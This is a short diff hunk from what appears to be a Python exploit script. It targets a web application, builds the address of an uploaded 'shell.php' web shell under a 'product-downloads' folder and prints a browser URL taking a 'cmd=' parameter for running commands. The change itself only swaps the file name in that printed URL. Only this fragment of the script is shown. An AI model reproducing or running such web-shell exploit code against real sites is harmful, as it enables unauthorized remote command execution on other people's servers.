@@ -86,7 +86,7 @@ time.sleep(1)
 
 exec_host = f"{host}{directory}/product-downloads/shell.php"
 
-print(f"\033[92mGetting a shell. To stop it, press CTRL + C. Browser url: {host}{directory}/product-downloads/logfile1313.php?cmd=\033[00m")
+print(f"\033[92mGetting a shell. To stop it, press CTRL + C. Browser url: {host}{directory}/product-downloads/shell.php?cmd=\033[00m")
 time.sleep(2)
 
 while True:
